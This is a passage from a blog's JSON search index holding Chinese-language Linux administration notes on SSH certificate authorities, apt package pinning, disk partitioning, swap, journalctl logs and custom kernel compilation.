\u5b89\u88c5iptabels-persistent</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#bridge-iptable\u4e0d\u751f\u6548","title":"bridge iptable\u4e0d\u751f\u6548","text":"<pre><code>bridge-nf-call-iptables - BOOLEAN\n    1 : pass bridged IPv4 traffic to iptables' chains.\n    0 : disable this.\n    Default: 1\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7cfb\u7edf\u7ef4\u62a4","title":"\u7cfb\u7edf\u7ef4\u62a4","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#ldap","title":"ldap","text":"<p>LDAP - ACSA Docs (acsalab.com)</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#systemd","title":"systemd","text":"<pre><code>sudo systemctl list-units --type=service --state=running\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#ssh\u8bc1\u4e66","title":"ssh\u8bc1\u4e66","text":"<p>SSH Certificate Authority - LUG @ USTC (ustclug.org) Managing servers with OpenSSH Certificate Authority - iBug</p> <ul> <li>client\u9a8c\u8bc1server\u8eab\u4efd\uff0c\u9700\u8981\u5c06server\u516c\u94a5\u6dfb\u52a0\u5230known_hosts\u4e2d\u3002</li> <li>\u5f53\u6709\u591a\u4e2a\u670d\u52a1\u5668\u65f6\uff0cclient\u9700\u8981\u540c\u610f\u591a\u6b21\uff08ssh\u65f6\u7684yes\uff09</li> <li>\u5f53server\u516c\u94a5\u53d8\u66f4\u65f6\uff0c\u8fd8\u5f97\u4fee\u6539known_hosts</li> <li>server\u9a8c\u8bc1client\u8eab\u4efd\uff0c\u540c\u6837\u9700\u8981\u5c06client public key\u6dfb\u52a0\u5230authorized_keys\u4e2d\u3002</li> <li>\u591a\u4e2a\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u5c06\u6bcf\u4e2aclient\u516c\u94a5\u590d\u5236\u5230\u6bcf\u4e2aserver\u3002</li> <li>\u4fee\u6539\u4e00\u4e2aclient\u9700\u8981\u4fee\u6539\u6240\u6709server</li> </ul> <p>SSH CA(Certificate Authority)\u662f\u4e00\u5bf9\u53d7\u4fe1\u4efb\u7684\u5bc6\u94a5\uff0c\u7528\u4e8e\u7b7e\u53d1\u8bc1\u4e66\u3002</p> <p>An SSH Certificate Authority (CA) is a trusted key pair that issues certificates.</p> <p>\u7b7e\u53d1\u7684\u8bc1\u4e66\u53ef\u4ee5\u7528\u6765\u6388\u6743client\u6216\u8005server\u3002\uff08\u901a\u8fc7\u4fe1\u4efbhost CA\uff0cclient\u53ef\u4ee5\u4fe1\u4efb\u6240\u6709server\uff0c\u53ea\u8981\u5b83\u4eec\u6709host CA\u7b7e\u540d\u7684\u8bc1\u4e66\u3002\u540c\u6837\uff0c\u901a\u8fc7\u4fe1\u4efbuser CA\uff0cserver\u53ef\u4ee5\u4fe1\u4efb\u6240\u6709\u7684client\uff0c\u53ea\u8981\u5b83\u4eec\u6709user CA\u7b7e\u540d\u7684\u8bc1\u4e66\u3002\uff09</p> <p>Certificates can be used for authentication on both the server side and the client side</p> <p>SSH CA\u548cX.509\u8bc1\u4e66\u7cfb\u7edf\u4e0d\u540c\u7684\u662f\uff0c\u8bc1\u4e66\u65e0\u6cd5\u7b7e\u53d1\u65b0\u7684\u8bc1\u4e66\uff08\u5373\u65e0\u6cd5\u5d4c\u5957\uff09</p> <p>host CA\u548cuser CA\u53ef\u4ee5\u662f\u4e0d\u540c\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u76f8\u540c\u7684\u3002 </p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#ssh-ca","title":"SSH CA","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u521b\u5efaca","title":"\u521b\u5efaCA","text":"<p>\u548c\u521b\u5efa\u4e00\u4e2a\u901a\u5e38\u7684\u5bc6\u94a5\u5bf9\u4e00\u6837\u3002 <pre><code> sudo ssh-keygen -f yfy_ca -t ed25519 -C \"yfy CA\"\n</code></pre> - -t dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa - -C comment\uff1a\u6dfb\u52a0\u5230\u516c\u94a5\u7ed3\u5c3e</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7b7e\u53d1\u8bc1\u4e66","title":"\u7b7e\u53d1\u8bc1\u4e66","text":"<pre><code>ssh-keygen -s /path/to/ssh_ca \\\n           -I certificate_identity \\\n           -n principals \\\n          [-O options] \\\n          [-V validity_interval] \\\n           public_key_file\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u4f7f\u7528host-ca\u6388\u6743server\u7aef","title":"\u4f7f\u7528host CA\u6388\u6743server\u7aef","text":"<p>\u7ed9server\u7684\u516c\u94a5ssh_host_rsa_key.pub\u7b7e\u540d <pre><code>ssh-keygen -s /path/to/ssh_ca \\\n           -I blog \\\n           -h \\\n           -n blog.s.ustclug.org,blog.p.ustclug.org,10.254.0.15,202.141.176.98,202.141.160.98 \\\n           ssh_host_rsa_key.pub\n</code></pre> - -h \u8868\u793a\u7b7e\u53d1\u7684\u662fhost\u8bc1\u4e66\uff08server\u7aef\uff09 - -n \u7528\u4e8e\u9650\u5236\u8be5\u8bc1\u4e66\u53ea\u5728\u63d0\u4f9b\u7684\u57df\u540d\u6216\u8005ip\u4e0a\u6709\u6548\u3002\u8fd9\u6837\u5373\u4f7f\u8be5\u8bc1\u4e66\u88ab\u5077\u4e86\uff0c\u5077\u7a83\u8005\u4e5f\u65e0\u6cd5\u4f2a\u9020\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002</p> <p>\u6dfb\u52a0\u5230sshd\u914d\u7f6e\u4e2d\uff0c\u8fd9\u6837client\u8fde\u63a5\u65f6\u4f1a\u5c1d\u8bd5\u63d0\u4f9b\u8be5\u8bc1\u4e66 <pre><code># /etc/ssh/sshd_config\nHostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub\n</code></pre></p> <p>\u5ba2\u6237\u7aef\u4fe1\u4efbCA\u673a\u6784 - \u5c06CA\u516c\u94a5\u4fdd\u5b58\u5728my_ca.pub\u4e2d <pre><code>printf \"@cert-authority * \" | cat - my_ca.pub &gt;&gt; ~/.ssh/known_hosts\n</code></pre> - \u4fdd\u5b58\u5728dns\u4e2d   - \u5229\u7528{command1 &amp;&amp; command2 }\u5c06\u4e24\u6761\u547d\u4ee4\u5408\u5e76\uff0c\u5c06\u5176\u8f93\u51fa\u91cd\u5b9a\u5411 <pre><code>{printf \"@cert-authority * \" &amp;&amp; dig ca.yfycloud.top TXT +noall +answer | awk -F'TXT' '{print $NF}' |xargs} &gt;&gt; ~/.ssh/known_hosts\n</code></pre> \u4f7f\u7528nslookup(windows bash\u4e0b\u6d4b\u8bd5) <pre><code>(printf \"@cert-authority * \" &amp;&amp; nslookup -q=txt ca.yfycloud.top |grep CA | xargs) &gt;&gt; ~/.ssh/known_hosts\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u4f7f\u7528user-ca\u6388\u6743client\u7aef","title":"\u4f7f\u7528user CA\u6388\u6743client\u7aef","text":"<p>\u670d\u52a1\u7aef\u4fe1\u4efbuser CA <pre><code>TrustedUserCAKeys /etc/ssh/ssh_user_ca\n</code></pre></p> <p>\u7ed9\u6307\u5b9a\u7528\u6237\u7b7e\u53d1\u8bc1\u4e66 <pre><code>ssh-keygen -s my_ca -I &lt;user name&gt; -n root,ubuntu id_rsa.pub\n</code></pre> - \u5c06\u751f\u6210\u7684id_rsa-cert.pub\u653e\u81f3id_rsa.pub\u540c\u4e00\u76ee\u5f55\uff0cssh\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\u4f1a\u81ea\u52a8\u8bfb\u53d6\u3002 - -n\u7528\u4e8e\u9650\u5236\u5141\u8bb8\u767b\u5f55\u7684\u7528\u6237</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5305\u7ba1\u7406\u5668apt","title":"\u5305\u7ba1\u7406\u5668apt","text":"<pre><code>apt show pkg -a #\u67e5\u770b\u5305\u7684\u6240\u6709\u4ed3\u5e93  # APT-Sources:\n</code></pre> <pre><code>--no-install-recommends\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u8be2\u6587\u4ef6","title":"\u67e5\u8be2\u6587\u4ef6","text":"<p>linux - List of files installed from apt package - Server Fault <pre><code>apt install apt-file\napt-file update\n</code></pre></p> <p>\u5217\u51fa\u5305\u7684\u5185\u5bb9 - \u5df2\u5b89\u88dd\u5305\uff1a<code>dpkg -L deb</code> - \u672a\u5b89\u88dd\u5305\uff1a<code>apt-file list $package</code> - \u6709deb\u6587\u4ef6\uff1a<code>dpkg --contents $package.deb</code></p> <p>\u67e5\u8be2\u6587\u4ef6\u4f4d\u4e8e\u54ea\u4e2a\u5305\u4e2d <pre><code>dpkg -S /usr/bin/nvidia-xconfig\napt-file search /usr/bin/nvidia-xconfig\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u6e90\u4f18\u5148\u7ea7","title":"\u6e90\u4f18\u5148\u7ea7","text":"<p>\u6309\u7167nvidia\u5b98\u7f51\u4e0b\u8f7d\u4e86\u672c\u5730\u7248\u672c\u7684cuda deb\uff0c\u5b89\u88c5\u540e\u5728<code>/var/cuda-repo-ubuntu2004-12-1-local</code>\u53ef\u4ee5\u770b\u5230deb\u5305\u3002\u4f46\u662fapt install\u65f6\u4ecd\u7136\u91c7\u7528\u4e86nvidia\u4ed3\u5e93\u7684\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a - \u76f4\u63a5\u6ce8\u91ca\u6389<code>/etc/apt/source.list</code>\u4e2d\u7684nvidia\u4ed3\u5e93\uff0c\u7136\u540eapt update   - \u4e5f\u6709\u53ef\u80fdsource.list\u4e2d\u6ca1\u6709developer.download.nvidia.com\uff0c\u90a3\u4e48\u7981\u7528<code>/etc/apt/source.list.d/</code>\u4e0b\u7684\u5728\u7ebfcuda\u4ed3\u5e93\u3002\u5982     <code>mv cuda-ubuntu2004-x86_64.list cuda-ubuntu2004-x86_64.list.bak</code>\u3002</p> <pre><code>vim /etc/apt/preference.d/cuda-repository-pin-600\n\n# Priority \u8d8a\u5c0f\u4f18\u5148\u7ea7\u8d8a\u9ad8\nPackage: nsight-compute\nPin: origin *ubuntu.com*\nPin-Priority: -1\n\nPackage: nsight-systems\nPin: origin *ubuntu.com*\nPin-Priority: -1\n\nPackage: *\nPin: release l=NVIDIA CUDA\nPin-Priority: 600\n</code></pre> <pre><code>\u279c  ~ apt-cache policy gnome-shell-extension-ubuntu-dock\ngnome-shell-extension-ubuntu-dock:\n  Installed: (none)\n  Candidate: 72~ubuntu5.22.04.2.1\n  Version table:\n     72~ubuntu5.22.04.2.1 500\n        500 http://mirrors.ustc.edu.cn/ubuntu jammy-updates/main amd64 Packages\n     72~ubuntu5 500\n        500 http://mirrors.ustc.edu.cn/ubuntu jammy/main amd64 Packages\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7528\u6237\u7ba1\u7406","title":"\u7528\u6237\u7ba1\u7406","text":"<ul> <li>adduser\uff1a\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237</li> <li>useradd\u4e3a\u66f4\u5e95\u5c42\u7684\u547d\u4ee4</li> <li>usermod -aG sudo user\uff1a\u5c06\u7528\u6237\u6dfb\u52a0\u5230sudo\u7ec4</li> <li>gpasswd -d user group: \u5c06\u7528\u6237\u4ece\u7ec4\u4e2d\u5220\u9664</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#linux\u5206\u533a","title":"linux\u5206\u533a","text":"<p>\u4f7f\u7528fdisk\u7ed9\u78c1\u76d8\u5206\u533a\u5e76\u6302\u8f7d</p> <p>\u5217\u51fa\u78c1\u76d8\u4fe1\u606f</p> <pre><code>sudo fdisk -l [device]\n</code></pre> <p>\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f</p> <pre><code>sudo fdisk [device]\n\nm   #\u5e2e\u52a9\np   #\u6253\u5370\u5f53\u524d\u5206\u533a\u8868\ng   #\u521b\u5efagpt\u5206\u533a\u8868\nn   #\u521b\u5efa\u5206\u533a\n</code></pre> <p>fdisk\u521b\u5efa\u5206\u533a\u540e</p> <ul> <li>\u901a\u8fc7<code>mkfs.ext4 /dev/sdb1</code>\u521b\u5efa\u6587\u4ef6ext4\u7cfb\u7edf\uff08p.s. \u6ce8\u610f\uff1a\u4e0d\u8981\u4f7f\u7528sdb\uff0c\u800c\u662fsdb1\u6307\u5b9a\u5206\u533a\uff09 <pre><code>mkfs.bfs     mkfs.cramfs  mkfs.ext2    mkfs.ext3    mkfs.ext4    mkfs.fat     mkfs.minix   mkfs.msdos   mkfs.ntfs    mkfs.vfat\n</code></pre></li> <li>\u901a\u8fc7<code>lsblk -f</code>\u663e\u793aUUID</li> <li><code>-f</code>\u8868\u793a\u6253\u5370\u6587\u4ef6\u7cfb\u7edf</li> <li>\u5728<code>/etc/fstab</code>\u4e2d\u6dfb\u52a0\u6302\u8f7d\u6761\u76ee\uff0c\u7136\u540e<code>mount -a</code>\u8868\u793a\u6302\u8f7dfstab\u4e2d\u7684\u6240\u6709\u6761\u76ee   \u793a\u4f8b   <pre><code>UUID=b7ee63d0-6cea-4615-b7ec-63449c8fa566 /mnt/Disk1    ext4    defaults 0 0\n</code></pre></li> <li>\u4fee\u6539\u6302\u8f7d\u70b9\u76ee\u5f55\u6743\u9650\uff0c\u9ed8\u8ba4\u53ea\u6709root\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee</li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#swap","title":"swap","text":"<pre><code>sudo dd if=/dev/zero of=/swapfile bs=1G count=16\nsudo mkswap swapfile\nsudo swapon swapfile\n\n#fstab \n/swapfile none swap sw 0 0\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#mount","title":"mount","text":"<p>Fstab - Community Help Wiki (ubuntu.com)</p> <p>mount\u53ea\u80fd\u7531root\u7528\u6237\u64cd\u4f5c\uff0c\u5bfc\u81f4mount\u7684\u76ee\u5f55\u6240\u6709\u8005\u4e3aroot\uff0c\u666e\u901a\u7528\u6237\u65e0\u6cd5\u8bbf\u95ee</p> <p>ext4 mount\u9009\u9879\u4e2d\u4e5f\u6ca1\u6709\u6307\u5b9auid\u7684\u65b9\u5f0f\u6302\u8f7d\u3002ext4(5) - Linux manual page (man7.org)</p> <p>\u89e3\u51b3\u529e\u6cd5\u662f\uff1amount\u4e4b\u540e\u4f7f\u7528chown\u547d\u4ee4\u5c06\u6302\u8f7d\u7684\u76ee\u5f55\u6539\u4e3a\u666e\u901a\u7528\u6237\u3002\u7531\u4e8e\u7528\u6237\u4fe1\u606f\u662f\u5199\u5165\u6587\u4ef6\u7cfb\u7edf\u7684\uff0c\u6240\u4ee5\u4e4b\u540e\u6302\u8f7d\u65f6\u6587\u4ef6\u6743\u9650\u4ecd\u7136\u662f\u666e\u901a\u7528\u6237\u3002</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u4f7f\u7528fdisk\u6269\u5c55\u5206\u533a","title":"\u4f7f\u7528fdisk\u6269\u5c55\u5206\u533a","text":"<p>\u8c8c\u4f3c\u5c31\u662ffdisk\u5148\u5220\u9664\uff0c\u518d\u521b\u5efa\uff0c\u4fdd\u8bc1\u8d77\u59cb\u4f4d\u7f6e\u4e00\u6837\u3002</p> <p>\u5c1d\u8bd5\u53d1\u73b0\u5e76\u4e0d\u884c\uff0cfdisk\u65f6\u786e\u5b9e\u4f1a\u63d0\u793a\u5df2\u7ecf\u6709ext4\u4fe1\u606f\u4e86\uff0cfdisk\u540e\u4e5f\u4e0d\u7528\u91cd\u65b0\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\uff0c\u4f46\u662fmount\u65f6\u4f1a\u62a5\u9519\u3002\u91cd\u65b0\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\u540e\u6587\u4ef6\u4fbf\u6ca1\u4e86\u3002</p> <pre><code>\u279c  /mnt sudo mount -a\nmount: /mnt/Disk2: wrong fs type, bad option, bad superblock on /dev/sdb1, missing codepage or helper program, or other error.\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#virtualbox\u5c06fix\u78c1\u76d8\u8f6c\u6362\u6210\u52a8\u6001\u78c1\u76d8","title":"Virtualbox\u5c06fix\u78c1\u76d8\u8f6c\u6362\u6210\u52a8\u6001\u78c1\u76d8","text":"<ul> <li>Virtualbox\u547d\u4ee4\u884c\u652f\u6301\u8f6c\u6362</li> <li>\u8f6c\u6362\u540e\uff0c\u66f4\u6539\u78c1\u76d8\u5927\u5c0f\u540e\uff0c\u53d1\u73b0\u672a\u5206\u914d\u7a7a\u95f4\u5728\u78c1\u76d8\u4e2d\u95f4\u3002\u539f\u56e0\u662f\uff0c\u5206\u533a\u8868\u662fdos\u683c\u5f0f\uff0c\u4ea7\u751f\u4e86\u6269\u5c55\u5206\u533a\u3002\u76f4\u63a5\u4f7f\u7528gparted\u5de5\u5177\u8fdb\u884c\u6269\u5c55\u5373\u53ef</li> </ul> <pre><code>\u7f16\u53f7  \u8d77\u59cb\u70b9  \u7ed3\u675f\u70b9  \u5927\u5c0f    \u7c7b\u578b      \u6587\u4ef6\u7cfb\u7edf  \u6807\u5fd7\n 1    1049kB  538MB   537MB   primary   fat32     \u542f\u52a8\n 2    539MB   53.7GB  53.1GB  extended\n 5    539MB   53.7GB  53.1GB  logical   ext4\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u65e5\u5fd7journalctl","title":"\u65e5\u5fd7/journalctl","text":"<p>How To Use Journalctl to View and Manipulate Systemd Logs | DigitalOcean</p> <pre><code>journalctl --list-boots\njournalctl -b # \u81ea\u4e0a\u6b21reboot\u5f00\u59cblog\njournalctl -b -1 # \u4e0a\u4e00\u6b21reboot\n\njournalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\"  # YYYY-MM-DD HH:MM:SS\njournalctl --since yesterday\n\njournalctl -k # \u5185\u6838\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u65e5\u5fd7\u6587\u4ef6","title":"\u65e5\u5fd7\u6587\u4ef6","text":"<ul> <li><code>/run/log/journal/MACHINE-ID/</code>\uff1a\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\uff0c\u91cd\u542f\u6d88\u5931</li> <li><code>/var/log/journal/MACHINE-ID</code>\uff1a\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d</li> </ul> <p>\u67e5\u770b\u5927\u5c0f\uff1a <pre><code>journalctl --disk-usage  # \u65e5\u5fd7\u5927\u5c0f\uff0c\u5305\u542b\u5f52\u6863\u65e5\u5fd7\n</code></pre> </p> <p>\u6e05\u9664\uff1a - vacuum\uff1a\u5220\u9664\u5f52\u6863\u7684\u65e5\u5fd7\uff08\u4e0d\u4f1a\u5220\u9664active\u7684\uff09 - rotate\uff1a\u5c06active\u5f52\u6863\u3002\u53ef\u4ee5\u5408\u5e76\u5230\u4e0a\u6761\u547d\u4ee4 <pre><code>journalctl --rotate\n\njournalctl --vacuum-time=1months  # \u4e00\u4e2a\u6708\u4ee5\u524d\u7684\u65e7\u65e5\u5fd7\u3002\u683c\u5f0f\uff1a1m, 2h, 2weeks, 4months\njournalctl --vacuum-size=100M     # \u53ea\u4fdd\u7559\u65b0\u7684100M\u5927\u5c0f\u7684\u65e5\u5fd7\n</code></pre></p> <p>\u8bbe\u7f6e\u6700\u5927\u65e5\u5fd7\u5927\u5c0f\uff1a <pre><code>/etc/systemd/journald.conf\nSystemMaxUse=100M\n</code></pre></p> <p>SystemMaxUse=, RuntimeMaxUse=</p> <p>Enforce size limits on the journal files stored. The options prefixed with \"System\" apply to the journal files when stored on a persistent file system, more specifically /var/log/journal. The options prefixed with \"Runtime\" apply to the journal files when stored on a volatile in-memory file system, more specifically /run/log/journal.</p> <p>MaxFileSec=</p> <p>The maximum time to store entries in a single journal file before rotating to the next one.</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u770b\u91cd\u542f\u539f\u56e0","title":"\u67e5\u770b\u91cd\u542f\u539f\u56e0","text":"<p>https://unix.stackexchange.com/a/278166</p> <pre><code>last -x |tac |less  # last\u663e\u793a\u6700\u540elogged\u7528\u6237\uff0ctac\u5c06\u6587\u672c\u9006\u5e8f\n</code></pre> <ul> <li>\u6b63\u5e38\u987a\u5e8f\uff1a</li> <li>reboot\u6ca1\u6709\u5bf9\u5e94\u7684shutdown\u8868\u793a\u975e\u6b63\u5e38\u5173\u673a <pre><code>shutdown system down  ... &lt;-- first the system shuts down   \nreboot   system boot  ... &lt;-- afterwards the system boots\nrunlevel (to lvl 3)  # runlevel3\u8868\u793a\u65e0\u56fe\u5f62\u754c\u9762\uff0c\u5f00\u673a\u684c\u9762\u73af\u5883\u53ef\u80fd\u662frunlevel 5\n</code></pre> </li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u67e5\u770bcrontab\u65e5\u5fd7","title":"\u67e5\u770bcrontab\u65e5\u5fd7","text":"<pre><code>grep CRON /var/log/syslog\n\njou -u cron\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u66f4\u6362\u5185\u6838","title":"\u66f4\u6362\u5185\u6838","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u7f16\u8bd1","title":"\u7f16\u8bd1","text":"<p>8.10.\u00a0Compiling a Kernel (debian-handbook.info)</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#disabling-the-debug-information","title":"disabling the debug information","text":"<pre><code>$ make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1\n[...]\n$ ls ../*.deb\n../linux-headers-5.10.46-falcot_5.10.46-1_amd64.deb\n../linux-image-5.10.46-falcot_5.10.46-1_amd64.deb\n../linux-image-5.10.46-falcot-dbg_5.10.46-1_amd64.deb\n../linux-libc-dev_5.10.46-1_amd64.deb\n</code></pre> <p>The whole process requires around 20 GB of free space, at least 8 GB of RAM, and several hours of compilation (utilizing one core) for a standard amd64 Debian kernel. These requirements can be drastically reduced by disabling the debug information using\u00a0<code>CONFIG_DEBUG_INFO=n</code>, but this will make it impossible to trace kernel errors (\u201coops\u201d) using\u00a0<code>gdb</code>\u00a0and also stop the creation of the\u00a0linux-image-version-dbg\u00a0package.</p> <pre><code># \u83b7\u5f97\u5f53\u524d\u5b98\u65b9kernel\u7f16\u8bd1\u914d\u7f6e\uff0c\u5982/boot/config-5.19.0-35-generic\nkernel_config=$(ls /boot/config-* | grep generic | sort -Vr | head -n 1) \ncp \"${kernel_config}\" .config\n\n# \u57fa\u4e8e\u5f53\u524d.confg\uff0c\u53ea\u8be2\u95ee\u65b0\u5185\u6838\u4e2d\u65b0\u529f\u80fd\u7684\u914d\u7f6e\nmake oldconfig \n\n# \u7f16\u8bd1\nmake -j \"$(nproc)\" bindeb-pkg LOCALVERSION=\"${kernel_localversion}\" || exit\n\n# \u5b89\u88c5\nsudo dpkg -i ../linux-image-${kernel_version}${kernel_localversion}*.deb ../linux-headers-${kernel_version}${kernel_localversion}*.deb\n\n# \u66f4\u65b0grub\uff0c\u901a\u8fc7GRUB_DEFAULT\u9009\u62e9\u7f16\u8bd1\u7684\u5185\u6838\nvim /etc/default/grub\ngrub_line=\"GRUB_DEFAULT=\\\"Advanced options for Ubuntu&gt;Ubuntu, with Linux ${kernel_version}${kernel_localversion}\\\"\"\nsudo sed -i -e \"s/^#GRUB_DEFAULT=.*/\\0\\n${grub_line}/\" \"${grub_config}\"\n\nsudo update-grub\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#missing-certificate","title":"missing certificate","text":"<p>Building a custom kernel based on these settings will fail if\u00a0<code>debian/certs/debian-uefi-certs.pem</code>\u00a0does not exist. This file can either be obtained from the kernel team's Git repository and placed into the source tree, or it can be replaced by your own certificate(s), or you'll have to disable the setting via\u00a0<code>CONFIG_SYSTEM_TRUSTED_KEYS=\"\"</code>.</p> <pre><code>sed -i -e '/^CONFIG_SYSTEM_TRUSTED_KEYS=/ c\\CONFIG_SYSTEM_TRUSTED_KEYS=\\\"\\\"' .config\nsed -i -e '/^CONFIG_SYSTEM_REVOCATION_KEYS=/ c\\CONFIG_SYSTEM_REVOCATION_KEY=\\\"\\\"' .config\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#dkms","title":"dkms","text":"<p>\u4f7f\u7528patched kernel\u540e\uff0c\u6ca1\u6709\u4e86zfs\uff0c\u65e0\u6cd5\u542f\u52a8lxc\u3002 Ubuntu 20.04, building patched kernel results in no ZFS support - Ask Ubuntu</p> <p>https://debian-handbook.info/browse/stable/sect.kernel-compilation.html#sect.modules-build - \u4e00\u4e9b\u6a21\u5757\u4e0d\u80fd\u6253\u5305\u5230linux\u5185\u6838\u4e2d - \u4f7f\u7528dkms\u81ea\u52a8\u5316\u7f16\u8bd1\u8fd9\u4e9b\u6a21\u5757\u3002\u9700\u8981\u5b89\u88c5\u4e86\u5bf9\u5e94\u7684<code>linux-headers-*</code></p> <p>Compiling External Modules Some modules are maintained outside of the official Linux kernel. To use them, they must be compiled alongside the matching kernel. While we could manually extract the tarball and build the module, in practice we prefer to automate all this using the DKMS framework (Dynamic Kernel Module Support). Most modules offer the required DKMS integration in a package ending with a\u00a0<code>-dkms</code>\u00a0suffix. \u00a0In our case, 